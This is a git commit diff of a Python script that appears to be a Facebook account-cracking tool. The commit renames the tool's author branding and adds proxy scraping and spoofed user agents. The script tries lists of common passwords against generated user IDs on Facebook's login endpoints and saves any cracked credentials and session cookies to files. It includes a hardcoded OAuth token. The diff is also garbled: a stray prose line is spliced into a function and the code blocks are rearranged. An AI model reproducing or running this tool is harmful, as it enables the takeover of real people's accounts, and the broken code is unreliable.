8313dd3c755df4a8eecb2cfd6cbc26876125ef43
SHANTO-KING <143583631+SHANTO-KING@users.noreply.github.com>
2023-10-10 23:38:39 +0600

    Add files via upload

--- testing.py
+++ testing.py
@@ -1,8 +1,8 @@
-#SC MAKED BY SHANTO
-#Fuck SHANTO HOSSEN
-#Dec By SHANTO
-#SHANTO Your Reyal Pappa
-#SHANTO Kids Numbar 5
+#SC MAKED BY PARVEJ
+#Fuck PARVEJ HOSSEN
+#Dec By PARVEJ
+#PARVEJ Your Reyal Pappa
+#PARVEJ Kids Numbar 5
 
 import os,sys,time,json,random,re,string,platform,base64,uuid
 from bs4 import BeautifulSoup as sop
@@ -64,68 +64,54 @@ cokbrut=[]
 ses=requests.Session()
 princp=[]
 #-------checker------#
-import os, uuid, random
-import requests as r
-
-def login():
-    os.system("clear")
-    print("\033[1;37m")
-    uid = "id lagale"
-    pww = "pass lagale"
-    ua = "[FBAN/Orca-Android;FBAV/5.0.0.16.1;FBLC/tr_TR;FBBV/2302400;FBCR/ T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/GT-I9300;FBSV/4.0.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=1066,height=552};]"
-    check(uid, pww, ua)
-
-def check(uid, pww, ua):
-    try:
-        data = {
-            "adid": str(uuid.uuid4()),
-            "device_id": str(uuid.uuid4()),
-            "email": uid,
-            "password": pww,
-            "cpl": "true",
-            "source": "device_based_login",
-            "format": "json",
-            "generate_session_cookies": "1",
-            "generate_analytic_claims": "1",
-            "generate_machine_id": "1",
-            "locale": "GB",
-            "country_code": "GB",
-            "client_country_code": "GB",
-            "currently_logged_in_userid": "0",
-        }
-        headers = {
-            "User-Agent": ua,
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
-            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
-            "X-FB-Connection-Quality": "EXCELLENT",
-            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
-            "X-FB-HTTP-Engine": "Liger",
-        }
-        url = "https://b-graph.facebook.com/auth/login"
-        result = r.post(url, data=data, headers=headers).json()
-        print(result)
-    except:
-        pass
-
-login()
-
+def lock_check(uid):
+    sessionx=requests.Session()
+    urlx=f'https://www.facebook.com/p/{uid}'
+    req=BeautifulSoup(sessionx.get(urlx).content,'html.parser')
+    tx=req.find('title').text
+    if tx =='Facebook':
+        return('LOCK')
+    else:
+        return('LIVE')
+try:
+ prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+ open('.prox.txt','w').write(prox)
+except Exception as e:
+ print('')
+prox=open('.prox.txt','r').read().splitlines()
+for xd in range(10000):
+    aa='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
+    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
+    c=' en-us; GT-'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='; U; Bada/1.2; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Dolfin/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile/18G82 [FBAN/FBIOS;FBAV/333.0.0.30.109;FBBV/313309308;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/14.7.1;FBSS/3;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/315505842]'
+    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+    ugen.append(uaku2)
 logo = ("""
-\033[1;33m  ░█▀▀▀█ ░█─░█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ░█▀▀▀█ 
-\033[1;32m  ─▀▀▀▄▄ ░█▀▀█ ░█▄▄█ ░█░█░█ ─░█── ░█──░█ 
-\033[1;36m  ░█▄▄▄█ ░█─░█ ░█─░█ ░█──▀█ ─░█── ░█▄▄▄█
+\033[1;33m d8888b.  .d8b.  d8888b. db    db d88888b    d88b 
+\033[1;33m 88  `8D d8' `8b 88  `8D 88    88 88'        `8P' 
+\033[1;32m 88oodD' 88ooo88 88oobY' Y8    8P 88ooooo     88  
+\033[1;32m 88~~~   88~~~88 88`8b   `8b  d8' 88~~~~~     88  
+\033[1;36m 88      88   88 88 `88.  `8bd8'  88.     db. 88  
+\033[1;36m 88      YP   YP 88   YD    YP    Y88888P Y8888P  
                                                  
-\033[1;91m\033[1;41m\033[1;97m              WELCOME TO SHANTO TOOLS               \033[;0m\033[1;91m\033[1;92m
+\033[1;91m\033[1;41m\033[1;97m              WELCOME TO PARVEJ TOOLS               \033[;0m\033[1;91m\033[1;92m
 
 \033[1;92m══════════════════════════════════════════
-\033[1;32m[-] TOOLS TYPE:\033[1;32m PRIVATE
-\033[1;32m[-] AUTHOR    :\033[1;32m SHANTO 
-\033[1;32m[-] GITHUB    :\033[1;32m SHANTO
-\033[1;32m[-] FACEBOOK  :\033[1;32m SH AN TO
+\033[1;32m[-] TOOLS TYPE:\033[1;32m PAID
+\033[1;32m[-] AUTHOR    :\033[1;32m PARVEJ HOSSEN
+\033[1;32m[-] GITHUB    :\033[1;32m ROMAN-XXX
+\033[1;32m[-] FACEBOOK  :\033[1;32m FH Roman
 \033[1;92m══════════════════════════════════════════
 
-\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS SHANTO BRAND\033[;0m\033[1;91m═══>\033[1;92m""")
+\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS PARVEJ BRAND\033[;0m\033[1;91m═══>\033[1;92m""")
 
 
 class Main:
@@ -240,56 +226,60 @@ def v3():
         print(50*'_')
         for guru in user:
             uid = kode+kodex+kod+guru
-            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh','sadiya','hridoy','sahin','nusrat','fatema','sabbir','mababa','708090','908070','free fire','freefire1234']
+            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh','sadiya','hridoy','sahin','nusrat','fatema','sabbir','708090','908070','free fire','freefire1234']
             yaari.submit(rcrack1,uid,pwx,tl)
     print(50*'_')
     print(' [♥] Crack process has been completed')
     print(' [♥] Ids saved in ok.txt,cp.txt')
     print(50*'_')
-def rcrack1(uid,pwx,tl):
-    global loop
-    global cps
-    global oks
-    global proxy
+import os, uuid, random
+import requests as r
+
+def login():
+    os.system("clear")
+    print("\033[1;37m")
+    uid = "id lagale"
+    pww = "pass lagale"
+    ua = "[FBAN/Orca-Android;FBAV/5.0.0.16.1;FBLC/tr_TR;FBBV/2302400;FBCR/ T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/GT-I9300;FBSV/4.0.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=1066,height=552};]"
+    check(uid, pww, ua)
+
+def check(uid, pww, ua):
     try:
-        for ps in pwx:
-            pro = random.choice(ugen)
-            session = requests.Session()
-            sys.stdout.write('\r[\033[1;92mSHANTO\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
-            sys.stdout.flush()
-            free_fb = session.get('https://free.facebook.com').text
-            log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "pass":ps,
-            "login":"Log In"}
-            header_freefb = {
-            'authority': 'www.facebook.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
-            'cache-control': 'max-age=0',
-            'dpr': '2',
-            'referer': 'https://web.facebook.com/',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Linux"',
-            'sec-ch-ua-platform-version': '""',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-site',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
-            'viewport-width': '980',
-}
+        data = {
+            "adid": str(uuid.uuid4()),
+            "device_id": str(uuid.uuid4()),
+            "email": uid,
+            "password": pww,
+            "cpl": "true",
+            "source": "device_based_login",
+            "format": "json",
+            "generate_session_cookies": "1",
+            "generate_analytic_claims": "1",
+            "generate_machine_id": "1",
+            "locale": "GB",
+            "country_code": "GB",
+            "client_country_code": "GB",
+            "currently_logged_in_userid": "0",
+        }
+        headers = {
+            "User-Agent": ua,
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
+            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
+            "X-FB-Connection-Quality": "EXCELLENT",
+            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
+            "X-FB-HTTP-Engine": "Liger",
+        }
+        url = "https://b-graph.facebook.com/auth/login"
+        result = r.post(url, data=data, headers=headers).json()
+        print(result)
+    except:
+        pass
+
+login()
+
+email or password Laga Lo aur test kro
             lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
@@ -299,21 +289,21 @@ def rcrack1(uid,pwx,tl):
                 if 'LOCK' in res:
                     return 'LOCK'
                 else:
-                    print(f"\033[38;5;46m[SHANTO-OK🌻] {uid}|{ps}")
+                    print(f'  \r\033[1;92m  [PAJVEJ-OK👨‍💻] '+uid+' • '+ps+'\33[0;92m')
                     print(f'  \r\033[1;92m  [COOKIE] '+coki)
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print(f"\x1b[38;5;196m[SHANTO-CP❌] {uid}|{ps}")
-                open('/sdcard/SHANTO-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                ##print(f"\x1b[38;5;196m[PARVEJ-CP❌] {uid}|{ps}")
+                open('/sdcard/PARVEJ-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[SHANTO-KING💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        sys.stdout.write(f'\r\033[m[PARVEJ-KING💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
